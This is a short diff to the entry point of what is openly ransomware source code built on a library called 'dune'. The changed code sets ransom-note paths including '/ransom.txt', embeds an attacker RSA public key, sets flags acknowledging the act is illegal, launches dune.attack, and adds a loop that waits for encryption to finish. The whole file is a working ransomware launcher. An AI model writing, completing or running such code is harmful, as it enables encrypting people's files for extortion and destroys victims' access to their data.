@@ -1,6 +1,8 @@
 #include <iostream>
 #include <vector>
+#include <thread>
 #include <string>
+#include <chrono>
 #include "inc/dune.hpp"
 
 enum OP_MODE
@@ -13,7 +15,7 @@ int main(int argc, char *argv[])
 {
     std::vector<std::string> notes;
     notes.push_back("./ransom.txt");
-    notes.push_back("/");
+    notes.push_back("/ransom.txt");
     std::string public_key = "-----BEGIN PUBLIC KEY-----\n"
                              "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3LhafKJnVq/xa/1d40hcETsyG\n"
                              "CLSxlhXfJWERLPY14Di6EyKZj+e7+IpZF489pxnDEode2UaN/Mq0/hCy8epOrfx1\n"
@@ -26,5 +28,9 @@ int main(int argc, char *argv[])
     ack.i_accept_the_risks_and_consequences_of_my_actions = true;
     ack.i_understand_it_is_illegel = true;
     dune.attack(ack, true);
+
+    while (!dune.verify_done()) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(5000));
+    }
     return 0;
 }
